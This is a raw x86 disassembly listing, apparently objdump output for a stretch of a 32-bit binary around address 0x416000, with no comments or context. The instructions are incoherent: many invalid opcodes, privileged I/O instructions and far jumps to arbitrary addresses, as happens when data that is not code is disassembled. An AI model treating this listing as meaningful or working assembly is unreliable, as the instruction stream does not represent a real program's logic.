  415c7d:	jno    0x415c74
  415c7f:	xor    bh,BYTE PTR [edx]
  415c81:	jno    0x415c8f
  415c83:	inc    edi
  415c84:	or     DWORD PTR [eax+0x8],edx
  415c87:	sbb    al,BYTE PTR ds:[eax]
  415c8a:	mov    ecx,0xe974174b
  415c8f:	pop    esp
  415c90:	sub    BYTE PTR [ebx-0x3a],ch
  415c93:	sub    BYTE PTR ds:[eax],ah
  415c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c97:	push   ebp
  415c98:	pop    ss
  415c99:	add    BYTE PTR [edx-0x3b89e8af],bl
  415c9f:	sbb    al,0xe9
  415ca1:	push   ebx
  415ca2:	mov    al,0x42
  415ca4:	sub    BYTE PTR [eax],al
  415ca6:	call   0xdb44:0x8c761711
  415cad:	inc    edi
  415cae:	mov    es,WORD PTR [eax]
  415cb0:	aas    
  415cb1:	adc    eax,0x1711ba00
  415cb6:	jbe    0x415c3c
  415cb8:	sbb    al,0xdb
  415cba:	push   edx
  415cbb:	jp     0x415cce
  415cbd:	pop    ss
  415cbe:	add    BYTE PTR [edx-0x7389e8ef],bl
  415cc4:	inc    esp
  415cc5:	fisttp DWORD PTR [edi-0x78]
  415cc8:	aas    
  415cc9:	sbb    al,BYTE PTR [eax]
  415ccb:	cmp    bh,BYTE PTR [esi]
  415ccd:	pop    ss
  415cce:	jbe    0x415d14
  415cd0:	aas    
  415cd1:	fisttp DWORD PTR [edi+0x46]
  415cd4:	daa    
  415cd5:	adc    eax,0x15523900
  415cda:	push   0x60d58800
  415cdf:	jb     0x415d1f
  415ce1:	in     al,dx
  415ce2:	jno    0x415d38
  415ce4:	and    ebp,esi
  415ce6:	pusha  
  415ce7:	add    BYTE PTR [eax+ebp*8+0x6e],al
  415ceb:	je     0x415d55
  415ced:	aad    0x60
  415cef:	jb     0x415d2f
  415cf1:	in     al,dx
  415cf2:	jno    0x415d14
  415cf4:	adc    dl,ah
  415cf6:	outs   dx,BYTE PTR ds:[esi]
  415cf7:	je     0x415d51
  415cf9:	inc    esp
  415cfa:	pop    ebp
  415cfb:	jae    0x415d39
  415cfd:	test   al,0x50
  415cff:	gs cmp bh,dl
  415d02:	pusha  
  415d03:	jb     0x415cfd
  415d05:	fisubr DWORD PTR [esi+0x65]
  415d08:	sub    cl,BYTE PTR [eax]
  415d0a:	dec    esp
  415d0b:	popa   
  415d0c:	sti    
  415d0d:	sti    
  415d0e:	pop    ds
  415d0f:	push   ebx
  415d10:	in     eax,dx
  415d11:	cmc    
  415d12:	jne    0x415d79
  415d14:	add    dl,ch
  415d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d17:	dec    ebp
  415d18:	popa   
  415d19:	jmp    0x415d0f
  415d1b:	dec    DWORD PTR [ebx-0x17]
  415d1e:	hlt    
  415d1f:	jae    0x415d41
  415d21:	fwait
  415d22:	jmp    0x501f:0xf5fd7671
  415d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d2a:	cmc    
  415d2b:	jae    0x415d2d
  415d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d2e:	out    0x6e,al
  415d30:	je     0x415d1a
  415d32:	aam    0x60
  415d34:	jb     0x415ce4
  415d36:	jmp    0x6873:0xe6882071
  415d3d:	enter  0x5d43,0x73
  415d41:	cmp    al,0xa8
  415d43:	push   eax
  415d44:	gs sub bh,dl
  415d47:	pusha  
  415d48:	jb     0x415dc2
  415d4a:	(bad)  [eax+esi*2-0x13]
  415d4e:	add    al,0x46
  415d50:	push   esp
  415d51:	pop    eax
  415d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d53:	dec    ebx
  415d54:	popa   
  415d55:	xor    DWORD PTR [ecx+ebp*1],ebp
  415d58:	adc    BYTE PTR gs:[esi],dh
  415d5b:	daa    
  415d5c:	jb     0x415d8f
  415d5e:	fsubr  QWORD PTR [edi]
  415d60:	push   eax
  415d61:	push   ecx
  415d62:	fbld   TBYTE PTR [esi]
  415d64:	imul   ebx,esp,0x40
  415d67:	sub    ah,BYTE PTR [esp+ecx*8-0x31]
  415d6b:	add    esp,DWORD PTR [esi-0x1b]
  415d6e:	icebp  
  415d6f:	daa    
  415d70:	addr16 loop 0x415d68
  415d73:	jmp    0x42f26eb
  415d78:	pop    esp
  415d79:	add    bl,dh
  415d7b:	hlt    
  415d7c:	daa    
  415d7d:	ins    BYTE PTR es:[edi],dx
  415d7e:	aam    0x8d
  415d80:	xor    DWORD PTR [edx-0x3a],esi
  415d83:	cli    
  415d84:	and    DWORD PTR [eax],esp
  415d86:	add    BYTE PTR [ebx],0x22
  415d89:	je     0x415d29
  415d8b:	add    DWORD PTR [esi],edx
  415d8d:	arpl   WORD PTR [ecx],si
  415d8f:	repnz pop ds
  415d91:	pop    edi
  415d92:	popf   
  415d93:	mov    al,ds:0xaf8161e7
  415d98:	add    DWORD PTR [ecx-0x6a],edx
  415d9b:	ret    0x750d
  415d9e:	nop
  415d9f:	dec    esi
  415da0:	push   ds
  415da1:	pop    esp
  415da2:	jae    0x415e14
  415da4:	aas    
  415da5:	push   esp
  415da6:	xor    DWORD PTR [ebx+eax*2+0x73],0x741e4c55
  415dae:	adc    DWORD PTR [eax+0x13],edx
  415db1:	ins    DWORD PTR es:[edi],dx
  415db2:	inc    esi
  415db3:	and    cl,0x45
  415db6:	gs push eax
  415db8:	xor    eax,0x2789504b
  415dbd:	add    BYTE PTR [edx+0x73],ah
  415dc0:	pop    ds
  415dc1:	je     0x415e01
  415dc3:	adc    DWORD PTR [ebx],0xe5e0d63
  415dc9:	ins    BYTE PTR es:[edi],dx
  415dca:	adc    eax,0x23500d85
  415dcf:	or     DWORD PTR [esi+0x27],edx
  415dd2:	psubsw mm7,QWORD PTR [ecx]
  415dd5:	daa    
  415dd6:	pop    ss
  415dd7:	adc    eax,0x2403255e
  415ddc:	sub    eax,DWORD PTR [edx+0x0]
  415ddf:	add    bl,BYTE PTR ds:0x38fd2153
  415de5:	cmp    DWORD PTR [edi],esp
  415de7:	fsub   QWORD PTR [edx]
  415de9:	pop    es
  415dea:	ds std 
  415dec:	cmp    BYTE PTR [edi],al
  415dee:	inc    ebx
  415def:	int    0x1f
  415df1:	or     al,0x26
  415df3:	(bad)  [esp+ebp*1]
  415df6:	and    eax,0x32e71ad6
  415dfb:	aam    0x22
  415dfd:	adc    ecx,DWORD PTR [edi]
  415dff:	ficom  WORD PTR [esi]
  415e01:	or     al,0x38
  415e03:	repz cmp BYTE PTR ds:0x292d8130,ah
  415e0a:	adc    DWORD PTR [ebp+0x5110041d],edx
  415e10:	cmp    ecx,ebx
  415e12:	test   BYTE PTR es:[ebx],ah
  415e15:	pop    es
  415e16:	ds cmp DWORD PTR gs:[ebx-0x3fea7eba],esi
  415e1e:	es (bad) 
  415e20:	push   ss
  415e21:	out    0x32,eax
  415e23:	test   BYTE PTR [ebx],ah
  415e25:	mov    bl,0xe
  415e27:	mov    ss,WORD PTR [edi]
  415e29:	int3   
  415e2a:	aaa    
  415e2b:	jae    0x415e41
  415e2d:	mov    ebx,0xb7155227
  415e32:	adc    DWORD PTR [edx+ebx*1-0x7b],eax
  415e36:	jecxz  0x415e99
  415e38:	sbb    cl,BYTE PTR [ebp-0x66d7c3f1]
  415e3e:	and    BYTE PTR [ebp+0x47],bl
  415e41:	jl     0x415e6a
  415e43:	add    BYTE PTR [ebp+0x24],al
  415e46:	jae    0x415e7b
  415e48:	and    ebx,DWORD PTR [edx]
  415e4a:	add    BYTE PTR [esi-0x6aba16bc],al
  415e50:	(bad)  
  415e51:	jmp    0x2685b396
  415e56:	outs   dx,BYTE PTR ds:[esi]
  415e57:	push   ebp
  415e58:	dec    ecx
  415e59:	cmp    al,0x70
  415e5b:	pop    ebp
  415e5c:	push   esp
  415e5d:	sbb    al,0x6e
  415e5f:	pop    edx
  415e60:	xor    eax,0x214f6d38
  415e65:	adc    al,0x5f
  415e67:	cmp    edx,DWORD PTR [eax]
  415e69:	sub    eax,0x35271942
  415e6e:	push   eax
  415e6f:	jmp    0x1db2886a
  415e74:	and    ah,BYTE PTR [esi]
  415e76:	jno    0x415e92
  415e78:	sbb    al,0x1c
  415e7a:	outs   dx,BYTE PTR ds:[esi]
  415e7b:	das    
  415e7c:	adc    al,0x1d
  415e7e:	arpl   cx,bp
  415e80:	add    esp,DWORD PTR [edx]
  415e82:	je     0x415e90
  415e84:	and    al,BYTE PTR [ebp+0x67]
  415e87:	sti    
  415e88:	xor    dl,al
  415e8a:	ins    DWORD PTR es:[edi],dx
  415e8b:	cli    
  415e8c:	ss call 0xf0a05bfd
  415e92:	jno    0x415eac
  415e94:	sub    eax,0x56cc7837
  415e99:	or     DWORD PTR [edx+edi*4+0x59],ebx
  415e9d:	call   0xdd7e3413
  415ea2:	dec    edi
  415ea3:	jmp    0xceb746dc
  415ea8:	add    BYTE PTR [eax-0x10],al
  415eab:	jae    0x415e79
  415ead:	inc    ebx
  415eae:	aaa    
  415eaf:	fs enter 0x92e,0x48
  415eb4:	nop
  415eb5:	inc    ebx
  415eb6:	std    
  415eb7:	ins    BYTE PTR es:[edi],dx
  415eb8:	fwait
  415eb9:	sub    eax,0x36886437
  415ebe:	or     DWORD PTR [edi-0x7b],ebx
  415ec1:	push   ds
  415ec2:	sti    
  415ec3:	popa   
  415ec4:	add    BYTE PTR [ebx+0x2461616e],ah
  415eca:	or     al,0x6d
  415ecc:	jne    0x415e7f
  415ece:	sub    esp,DWORD PTR [edi+0x2e]
  415ed1:	mov    ah,0x2d
  415ed3:	je     0x415ed5
  415ed5:	in     al,dx
  415ed6:	cmp    BYTE PTR [ecx+0x72],dh
  415ed9:	cli    
  415eda:	sub    eax,0xd485446
  415edf:	dec    edi
  415ee0:	outs   dx,DWORD PTR ds:[esi]
  415ee1:	neg    BYTE PTR [eax]
  415ee3:	jae    0x415f46
  415ee5:	cmp    ch,BYTE PTR [eax]
  415ee7:	pop    esp
  415ee8:	push   esp
  415ee9:	and    eax,0x166f621b
  415eee:	cmp    DWORD PTR [eax+0x0],edx
  415ef1:	icebp  
  415ef2:	outs   dx,DWORD PTR cs:[esi]
  415ef4:	je     0x415f1f
  415ef6:	xor    DWORD PTR [eax+esi*2+0x39],ebp
  415efa:	sbb    DWORD PTR [eax+0x0],ebp
  415efd:	or     ebp,DWORD PTR [esi]
  415eff:	data16 je 0x415f29
  415f02:	sub    al,0x72
  415f04:	gs or  al,0x3a
  415f07:	imul   esi,DWORD PTR [ecx+edi*1+0x41],0x46
  415f0c:	inc    esi
  415f0d:	add    BYTE PTR [esi+0x39],dl
  415f10:	push   eax
  415f11:	add    BYTE PTR [ebx+0x1b],cl
  415f14:	popa   
  415f15:	fs in  eax,0x2d
  415f18:	je     0x415f83
  415f1a:	stc    
  415f1b:	das    
  415f1c:	dec    edi
  415f1d:	popa   
  415f1e:	in     al,dx
  415f1f:	pop    ss
  415f20:	add    BYTE PTR [ebx-0x26],al
  415f23:	es fs ficom WORD PTR gs:[edi]
  415f28:	gs popa 
  415f2a:	cld    
  415f2b:	enter  0x6567,0xfb
  415f2f:	xor    BYTE PTR [eax],al
  415f31:	push   ebx
  415f32:	lahf   
  415f33:	and    eax,0x19a97774
  415f38:	popa   
  415f39:	pop    esp
  415f3a:	mov    ebp,DWORD PTR [esp+esi*2]
  415f3d:	popa   
  415f3e:	xor    DWORD PTR [esi-0x4188b9c5],edi
  415f44:	xor    DWORD PTR [esi+eiz*2+0x2],ebx
  415f48:	or     eax,0x10981e67
  415f4d:	add    BYTE PTR [ecx],al
  415f4f:	xchg   ecx,eax
  415f50:	adc    BYTE PTR [ecx+0x26],dh
  415f53:	pop    es
  415f54:	pcmpgtb mm6,QWORD PTR [ecx]
  415f57:	inc    ebp
  415f58:	packsswb mm0,QWORD PTR [ebx]
  415f5b:	cmp    BYTE PTR [ecx],ah
  415f5d:	imul   ecx,DWORD PTR [edx+esi*2],0x49
  415f61:	ins    DWORD PTR es:[edi],dx
  415f62:	add    bl,dh
  415f64:	inc    eax
  415f65:	add    eax,DWORD PTR fs:[ebx+0x4]
  415f69:	push   edx
  415f6a:	aam    0xd4
  415f6c:	and    dh,BYTE PTR [esp+ecx*8+0x35]
  415f70:	sub    DWORD PTR [edx+0x0],esi
  415f73:	xor    DWORD PTR [edx],esp
  415f75:	and    esi,DWORD PTR [edx-0x23]
  415f78:	jno    0x415fc3
  415f7a:	ins    DWORD PTR es:[edi],dx
  415f7b:	ret    0x461d
  415f7e:	pop    edi
  415f7f:	aam    0x14
  415f81:	add    al,0x50
  415f83:	into   
  415f84:	and    edx,DWORD PTR [eax]
  415f86:	add    ah,bl
  415f88:	sbb    BYTE PTR [esi],0x72
  415f8b:	lahf   
  415f8c:	adc    DWORD PTR ds:0x21203163,esp
  415f92:	jno    0x415f36
  415f94:	jg     0x415fba
  415f96:	jb     0x415f25
  415f98:	jo     0x415fe3
  415f9a:	ins    DWORD PTR es:[edi],dx
  415f9b:	sbb    BYTE PTR [ebp+edi*1+0x67],0x83
  415fa0:	scas   al,BYTE PTR es:[edi]
  415fa1:	and    ch,BYTE PTR [ebx-0x6c]
  415fa4:	jo     0x415fd6
  415fa6:	ins    DWORD PTR es:[edi],dx
  415fa7:	pop    esp
  415fa9:	or     al,0x5f
  415fab:	arpl   WORD PTR [ebp+0x35],cx
  415fae:	inc    ecx
  415faf:	push   esi
  415fb0:	push   esi
  415fb1:	sbb    esp,DWORD PTR [ebx+0x54]
  415fb4:	mov    bl,0xe
  415fb6:	jo     0x415fc9
  415fb8:	or     DWORD PTR [edx-0x6a02a8dc],edi
  415fbe:	and    al,BYTE PTR [ebx-0x14]
  415fc1:	mov    dl,0x4a
  415fc3:	dec    edi
  415fc4:	std    
  415fc5:	adc    DWORD PTR [ecx],0x47
  415fc8:	in     al,dx
  415fc9:	jp     0x416002
  415fcb:	add    ebx,edi
  415fcd:	lea    ebx,ds:0x108bf50e
  415fd3:	xor    edx,ebx
  415fd5:	jge    0x415ff4
  415fd7:	add    BYTE PTR ds:0x121647fe,bl
  415fdd:	in     eax,0x24
  415fdf:	cmp    cl,ah
  415fe1:	fld    QWORD PTR [edi+0x16]
  415fe4:	adc    ah,ch
  415fe6:	sub    DWORD PTR [ebx-0x1d],eax
  415fe9:	retf   
  415fea:	sub    al,0x38
  415fec:	add    ebp,esp
  415fee:	sbb    DWORD PTR ds:0x439ebdd,ebx
  415ff4:	jmp    0x315999ee
  415ff9:	fcomp  QWORD PTR [ecx]
  415ffb:	sub    ebx,eax
  415ffd:	or     BYTE PTR [edi],dh
  415fff:	and    eax,ebx
  416001:	cld    
  416002:	out    0x33,al
  416004:	in     al,0x8
  416006:	aaa    
  416007:	sbb    cl,cl
  416009:	(bad)  
  41600b:	ss adc cl,0xe6
  41600f:	adc    esp,DWORD PTR [ebx-0x72e2f30a]
  416015:	in     al,dx
  416016:	stc    
  416017:	loope  0x415fb7
  416019:	hlt    
  41601a:	rol    BYTE PTR [ebx],cl
  41601c:	ins    DWORD PTR es:[edi],dx
  41601d:	iret   
  41601e:	mov    dl,0x33
  416020:	push   ecx
  416021:	int3   
  416022:	into   
  416023:	adc    ecx,DWORD PTR [ebp-0x7cd7270a]
  416029:	or     DWORD PTR [edx-0x4a02a8de],ebx
  41602f:	and    al,0x63
  416031:	in     al,dx
  416032:	call   DWORD PTR [eax+ebp*2+0x68094fdd]
  416039:	add    DWORD PTR [eax-0x6b],esi
  41603c:	add    BYTE PTR [ebx],dl
  41603e:	sti    
  41603f:	bound  ebx,QWORD PTR [ebx-0x46ac30ea]
  416045:	ror    dl,cl
  416047:	ja     0x415fe2
  416049:	push   ss
  41604a:	hlt    
  41604b:	jno    0x415fd9
  41604d:	inc    esp
  41604e:	in     eax,0x54
  416050:	mov    ?,WORD PTR [eax+esi*8]
  416053:	jo     0x4160ce
  416055:	push   ebp
  416056:	call   0xcf32edbd
  41605b:	inc    eax
  41605c:	cmp    eax,0x2b6bf452
  416061:	dec    esp
  416062:	sti    
  416063:	sub    bl,BYTE PTR [ebx]
  416065:	cmp    DWORD PTR [bx+si],eax
  416068:	sub    ebx,DWORD PTR [eax]
  41606a:	std    
  41606b:	jae    0x4160c3
  41606d:	adc    edi,eax
  41606f:	call   FWORD PTR [ecx]
  416071:	adc    ch,bh
  416073:	jae    0x4160b3
  416075:	adc    al,0xfb
  416077:	bound  ecx,QWORD PTR ds:0xc94fdceb
  41607d:	stc    
  41607e:	add    BYTE PTR [eax+0xd],dh
  416081:	adc    bh,bl
  416083:	bound  ebx,QWORD PTR [ebx]
  416085:	add    ecx,ebx
  416087:	jno    0x416087
  416089:	or     dh,ch
  41608b:	imul   ecx,DWORD PTR [esi+eax*2],0x9
  41608f:	push   eax
  416090:	or     BYTE PTR [esi],bh
  416092:	cli    
  416093:	je     0x41609b
  416095:	inc    edi
  416096:	in     eax,dx
  416097:	call   FWORD PTR [eax]
  416099:	dec    esp
  41609a:	cli    
  41609b:	jo     0x41607b
  41609d:	push   ebx
  41609e:	mul    DWORD PTR [ebx-0x4b]
  4160a1:	add    BYTE PTR ds:0x3ae962f9,dh
  4160a7:	div    BYTE PTR [eax-0x2b]
  4160aa:	xor    dl,ch
  4160ac:	ins    BYTE PTR es:[edi],dx
  4160ad:	add    bh,bh
  4160af:	and    eax,0x27c8006e
  4160b4:	jb     0x41612a
  4160b6:	enter  0x6e45,0x69
  4160ba:	pushf  
  4160bb:	and    eax,0x2d886c5d
  4160c0:	je     0x41612a
  4160c2:	fcom   st(2)
  4160c4:	jae    0x416136
  4160c6:	jnp    0x4160ed
  4160c8:	je     0x41612f
  4160ca:	jbe    0x4160dc
  4160cc:	imul   ebp,DWORD PTR [eax+ebx*4+0x34],0x2fc17246
  4160d4:	pop    ebp
  4160d5:	je     0x416084
  4160d7:	pop    ebx
  4160d8:	std    
  4160d9:	sub    eax,0x652ab1
  4160de:	hlt    
  4160df:	ds pop ebp
  4160e1:	outs   dx,BYTE PTR ds:[esi]
  4160e2:	dec    esp
  4160e3:	adc    BYTE PTR [edi+0x65],ah
  4160e6:	inc    esp
  4160e7:	into   
  4160e8:	push   0x6e
  4160ea:	out    dx,al
  4160eb:	pop    ds
  4160ec:	arpl   WORD PTR [ebx+ecx*2+0x2c],bx
  4160f0:	outs   dx,DWORD PTR ds:[esi]
  4160f1:	jae    0x4160f4
  4160f3:	sub    ch,BYTE PTR [esi+0x73]
  4160f6:	dec    eax
  4160f7:	xor    al,0x4f
  4160f9:	sbb    ebx,DWORD PTR gs:[esi]
  4160fc:	outs   dx,DWORD PTR gs:[esi]
  4160fe:	es push ds
  416100:	add    BYTE PTR [ebx+0x37],dl
  416103:	das    
  416104:	je     0x41617d
  416106:	add    BYTE PTR [ecx],ch
  416108:	sbb    esp,DWORD PTR [ecx+0x5c]
  41610b:	(bad)  
  41610c:	daa    
  41610d:	outs   dx,BYTE PTR ds:[esi]
  41610e:	inc    esp
  41610f:	xor    DWORD PTR [esi],esp
  416111:	popa   
  416112:	pop    esp
  416113:	dec    ebx
  416114:	sub    al,0x5f
  416116:	jne    0x416132
  416118:	sub    eax,DWORD PTR [esi+0x58]
  41611b:	or     ch,cl
  41611d:	push   0x6e
  41611f:	(bad)  
  416120:	push   ds
  416121:	arpl   WORD PTR [eax],sp
  416123:	enter  0x7426,0x68
  416127:	xor    DWORD PTR [edx+0x36],esi
  41612a:	ins    BYTE PTR es:[edi],dx
  41612b:	jge    0x41618d
  41612d:	and    al,BYTE PTR [esi-0x77]
  416130:	mov    ds:0x59625c01,al
  416135:	adc    eax,0xc0c6263
  41613a:	imul   eax,DWORD PTR [ebp+0x72],0x2d
  41613e:	inc    esi
  41613f:	gs ret 0x7333
  416143:	inc    edx
  416144:	call   0x5119:0x9f445201
  41614b:	dec    eax
  41614c:	sahf   
  41614d:	es sub DWORD PTR cs:[ebp-0x72fdffe3],ebx
  416155:	adc    esi,DWORD PTR [esi+0x14]
  416158:	add    BYTE PTR [ecx],al
  41615a:	push   ebx
  41615b:	and    cl,BYTE PTR [ebp-0x22ef91ed]
  416161:	and    al,0x0
  416163:	loope  0x416135
  416165:	adc    dh,BYTE PTR [ecx+0x6]
  416168:	retf   
  416169:	adc    eax,0x2c310064
  41616e:	sbb    BYTE PTR [eax+0x1],dh
  416171:	fist   DWORD PTR ds:0x1f1f3174
  416177:	in     ax,0x42
  41617a:	and    DWORD PTR [edx-0x34],esi
  41617d:	adc    eax,0x14c87243
  416182:	push   ss
  416183:	pop    esp
  416184:	fimul  WORD PTR [esi+eiz*1]
  416187:	push   ecx
  416188:	enter  0x2525,0x50
  41618c:	mov    esp,0xa267200f
  416191:	sbb    BYTE PTR ds:0x46243172,ah
  416197:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416199:	daa    
  41619a:	sbb    DWORD PTR [esi-0x74],ebp
  41619d:	js     0x4161a0
  41619f:	bound  ebx,QWORD PTR [eax-0x71e324f7]
  4161a5:	repz ret 
  4161a7:	or     ecx,DWORD PTR [edi-0x13]
  4161aa:	fld    DWORD PTR [ebx]
  4161ac:	imul   esi,edx,0xe85f17d9
  4161b2:	shl    DWORD PTR [esi],cl
  4161b4:	xor    esp,ebx
  4161b6:	mov    ecx,0xc7f36326
  4161bb:	push   ds
  4161bc:	push   edx
  4161bd:	or     DWORD PTR [edi-0x6209bfde],edx
  4161c3:	and    BYTE PTR [ebx-0x13],al
  4161c6:	out    0x33,al
  4161c8:	dec    esp
  4161c9:	neg    DWORD PTR [edx-0x7b0d9ffd]
  4161cf:	pop    ss
  4161d0:	add    BYTE PTR [eax+ebp*8],ah
  4161d3:	js     0x4161fb
  4161d5:	add    eax,0xfe137ecc
  4161da:	repnz stos BYTE PTR es:[edi],al
  4161dc:	adc    eax,0x2f83fb0e
  4161e1:	loopne 0x4161ce
  4161e3:	pop    ecx
  4161e4:	adc    ecx,DWORD PTR [esi]
  4161e6:	repnz dec esp
  4161e8:	adc    esi,DWORD PTR [ecx]
  4161ea:	in     eax,0x2b
  4161ec:	or     al,0x1
  4161ee:	call   0xf024aa2f
  4161f3:	cmp    al,0x29
  4161f5:	xor    ebp,esp
  4161f7:	inc    edx
  4161f8:	adc    dl,dh
  4161fa:	cli    
  4161fb:	dec    ebx
  4161fc:	adc    eax,DWORD PTR [edi]
  4161fe:	out    dx,eax
  4161ff:	cmp    DWORD PTR [ebx+edx*1],eax
  416202:	stc    
  416203:	pop    es
  416204:	adc    eax,eax
  416206:	stc    
  416207:	or     eax,0xc726d512
  41620c:	leave  
  41620d:	push   ss
  41620e:	daa    
  41620f:	out    0xe1,eax
  416211:	pop    edx
  416212:	or     DWORD PTR [edx],ebx
  416214:	pop    ds
  416215:	(bad)  
  416216:	std    
  416217:	cmc    
  416218:	and    al,0xa3
  41621a:	in     al,dx
  41621b:	call   DWORD PTR [eax+ebp*2]
  41621e:	add    DWORD PTR [eax+0x8],esi
  416221:	das    
  416222:	int    0x71
  416224:	rcr    BYTE PTR [esi+eiz*8],1
  416227:	jmp    DWORD PTR [ebx-0x38a106d6]
  41622d:	outs   dx,BYTE PTR ds:[esi]
  41622e:	mul    DWORD PTR [esi-0x29]
  416231:	sbb    esp,esp
  416233:	inc    edi
  416234:	(bad)  
  416235:	add    BYTE PTR [ecx],dl
  416237:	out    0xff,al
  416239:	cdq    
  41623a:	or     edi,esi
  41623c:	jne    0x41620a
  41623e:	inc    eax
  41623f:	or     DWORD PTR [ebx-0x46],edx
  416242:	sbb    edi,esi
  416244:	dec    ebp
  416245:	mov    BYTE PTR [ecx],dl
  416247:	out    0xff,al
  416249:	mov    eax,0x9e70f815
  41624e:	pop    ss
  41624f:	mul    DWORD PTR [ebx-0x17]
  416252:	pop    edi
  416253:	fstp   DWORD PTR [esi+0x7a]
  416256:	inc    ebx
  416257:	cld    
  416258:	ins    BYTE PTR es:[edi],dx
  416259:	jnp    0x4162b1
  41625b:	or     DWORD PTR [eax+eax*4+0x40],eax
  41625f:	out    0x60,al
  416261:	jne    0x416292
  416263:	div    DWORD PTR [esi-0x17]
  416266:	inc    ebx
  416267:	hlt    
  416268:	gs push ebp
  41626a:	es loop 0x4162de
  41626d:	dec    esp
  41626e:	inc    ecx
  41626f:	rol    DWORD PTR [eax+0x21],cl
  416272:	push   ebp
  416273:	fsubr  DWORD PTR [edi+ecx*2+0x49]
  416277:	cld    
  416278:	pop    esi
  416279:	cmp    ecx,DWORD PTR [eax]
  41627b:	in     eax,0x40
  41627d:	inc    ebp
  41627e:	or     al,0xf8
  416280:	jo     0x4162c2
  416282:	adc    cl,bl
  416284:	push   ebx
  416285:	cmp    DWORD PTR [ecx],eax
  416287:	retf   
  416288:	push   ebx
  416289:	cmp    esp,esi
  41628b:	out    0x60,eax
  41628d:	push   es
  41628e:	sbb    bl,dh
  416290:	jae    0x4162ac
  416292:	xor    eax,0x280073c7
  416297:	cmp    al,0x61
  416299:	jb     0x41629b
  41629b:	xor    dh,BYTE PTR es:[edx+0x0]
  41629f:	inc    esi
  4162a0:	and    DWORD PTR [eax+0x55],esi
  4162a3:	or     esi,DWORD PTR [edx]
  4162a5:	jb     0x4162f5
  4162a7:	stc    
  4162a8:	sub    DWORD PTR [ecx+0x0],esp
  4162ab:	(bad)  
  4162ac:	sbb    BYTE PTR [eax+0x50],dh
  4162af:	jmp    0xafb8d1cf
  4162b4:	sbb    ah,BYTE PTR [eax+eax*1-0x71]
  4162b8:	(bad)  
  4162b9:	jae    0x41632b
  4162bb:	mov    eax,0x97736f25
  4162c0:	pop    ds
  4162c1:	jb     0x416327
  4162c3:	fadd   st,st(6)
  4162c5:	jae    0x416337
  4162c7:	xchg   esp,eax
  4162c8:	sbb    eax,0x18ab6572
  4162cd:	imul   esi,DWORD PTR [edx-0x5f],0xc
  4162d1:	dec    edi
  4162d2:	dec    edi
  4162d3:	(bad)  
  4162d4:	cmp    BYTE PTR [ebx+0x41],dl
  4162d7:	retf   0x5bd1
  4162da:	dec    esi
  4162db:	retf   
  4162dc:	inc    esp
  4162dd:	and    BYTE PTR [ebx-0x51],dl
  4162e0:	es je  0x41635a
  4162e3:	mov    ecx,0x565c611a
  4162e8:	sub    DWORD PTR [ebp+0x6e],esp
  4162eb:	idiv   DWORD PTR [eax]
  4162ed:	cmp    eax,0x711deb63
  4162f2:	outs   dx,BYTE PTR ds:[esi]
  4162f3:	add    al,0x1a
  4162f5:	add    BYTE PTR [ebx-0x1],dl
  4162f8:	es je  0x416372
  4162fb:	jmp    0x9dc41a
  416300:	push   es
  416301:	inc    ecx
  416302:	push   eax
  416303:	inc    ebx
  416304:	or     al,0x24
  416306:	popa   
  416307:	outs   dx,BYTE PTR ds:[esi]
  416308:	and    al,0x39
  41630a:	dec    edi
  41630b:	imul   esp,DWORD PTR [eax+ebp*1],0x4331006f
  416312:	sbb    esp,DWORD PTR [esi-0x5b]
  416315:	pop    ss
  416316:	and    DWORD PTR [edx-0x74],esi
  416319:	es das 
  41631b:	ins    DWORD PTR es:[edi],dx
  41631c:	xchg   edi,eax
  41631d:	jbe    0x416348
  41631f:	xchg   BYTE PTR cs:[esp+0x3416775c],al
  416327:	inc    ecx
  416328:	xchg   ebp,eax
  416329:	pop    ecx
  41632a:	outs   dx,BYTE PTR es:[esi]
  41632c:	test   DWORD PTR [esi+0x4d7d6730],edi
  416332:	adc    BYTE PTR [eax],al
  416334:	pop    ds
  416335:	mov    edi,0x18316109
  41633a:	sbb    ebp,DWORD PTR [ebp+ecx*2+0x72]
  41633e:	and    esi,DWORD PTR [ecx+eiz*2+0x46]
  416342:	and    dh,BYTE PTR [ecx+0x45]
  416345:	sbb    BYTE PTR [ecx+esi*2],0x4d
  416349:	jb     0x416378
  41634b:	inc    ebp
  41634c:	popa   
  41634d:	ret    
  41634e:	sbb    al,0x66
  416350:	cmp    eax,0x1472229f
  416355:	scas   al,BYTE PTR es:[edi]
  416356:	inc    ebp
  416357:	and    ecx,DWORD PTR [di+0x7420]
  41635c:	push   cs
  41635d:	add    al,0xa
  41635f:	and    dh,ah
  416361:	add    DWORD PTR [esi],edx
  416363:	jno    0x416365
  416365:	xor    DWORD PTR [esi-0x1bef97d0],ecx
  41636b:	and    al,0x64
  41636d:	loop   0x416333
  41636f:	pop    ss
  416370:	je     0x41637a
  416372:	enter  0x7122,0x1f
  416376:	rcr    DWORD PTR [esi],cl
  416378:	jno    0x4163ab
  41637a:	es das 
  41637c:	push   0x642543d0
  416381:	add    cl,ch
  416383:	pop    ss
  416384:	je     0x41635e
  416386:	aas    
  416387:	and    esi,DWORD PTR [ecx-0x1a]
  41638a:	or     al,bl
  41638c:	sub    al,0x1
  41638e:	loopne 0x416363
  416390:	fst    st(1)
  416392:	jmp    0x4163ad
  416394:	add    al,0x8d
  416396:	(bad)  
  416398:	and    ah,BYTE PTR [ebx-0x6dcef51c]
  41639e:	cmc    
  41639f:	repnz sbb al,BYTE PTR [edi-0x7e22061a]
  4163a6:	clc    
  4163a7:	cli    
  4163a8:	sbb    bh,BYTE PTR [ebp-0x1c]
  4163ab:	out    0x2f,al
  4163ad:	pusha  
  4163ae:	icebp  
  4163af:	(bad)  
  4163b0:	adc    DWORD PTR [edx+0x6526b9e5],edx
  4163b6:	cmc    
  4163b7:	mov    edi,0xa5fa4c1d
  4163bc:	sar    BYTE PTR [ebp+0x39],cl
  4163bf:	sahf   
  4163c0:	(bad)  
  4163c1:	add    al,0xfa
  4163c3:	mov    bh,0x1f
  4163c5:	push   esi
  4163c6:	cmc    
  4163c7:	ret    
  4163c8:	add    eax,DWORD PTR [eax]
  4163ca:	gs retf 0x2595
  4163ce:	push   edi
  4163cf:	in     al,0x83
  4163d1:	inc    eax
  4163d2:	inc    edx
  4163d3:	stc    
  4163d4:	(bad)  
